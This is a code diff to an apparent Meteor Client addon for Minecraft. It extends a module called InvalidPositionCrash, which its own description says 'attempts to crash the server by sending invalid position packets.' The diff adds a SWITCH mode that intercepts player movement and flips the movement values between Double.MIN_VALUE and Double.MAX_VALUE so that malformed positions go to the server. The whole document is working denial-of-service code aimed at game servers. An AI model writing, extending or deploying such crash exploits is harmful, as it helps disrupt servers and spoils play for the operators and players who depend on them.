@@ -1,7 +1,9 @@
 package widecat.meteorcrashaddon.modules;
 
+import meteordevelopment.meteorclient.events.entity.player.PlayerMoveEvent;
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
+import meteordevelopment.meteorclient.mixininterface.IVec3d;
 import meteordevelopment.meteorclient.settings.*;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.meteorclient.utils.Utils;
@@ -40,6 +42,8 @@ public class InvalidPositionCrash extends Module {
     public InvalidPositionCrash() {
         super(CrashAddon.CATEGORY, "invalid-position-crash", "Attempts to crash the server by sending invalid position packets. (may freeze or kick you)");
     }
+
+    private boolean Switch = false;
 
     @Override
     public void onActivate() {
@@ -91,6 +95,24 @@ public class InvalidPositionCrash extends Module {
     }
 
     @EventHandler
+    private void onMove(PlayerMoveEvent event) {
+        if (Utils.canUpdate()) {
+            switch (packetMode.get()) {
+                case SWITCH -> {
+                    if (Switch) {
+                        ((IVec3d) event.movement).set(Double.MIN_VALUE, event.movement.getY(), Double.MIN_VALUE);
+                        Switch = false;
+                    }
+                    else {
+                        ((IVec3d) event.movement).set(Double.MAX_VALUE, event.movement.getY(), Double.MAX_VALUE);
+                        Switch = true;
+                    }
+                }
+            }
+        }
+    }
+
+    @EventHandler
     private void onGameLeft(GameLeftEvent event) {
         if (autoDisable.get()) toggle();
     }
@@ -101,6 +123,7 @@ public class InvalidPositionCrash extends Module {
         FULL_NAN,           //patched in vanilla
         INFINITY,
         TP,
-        VELT
+        VELT,
+        SWITCH
     }
 }
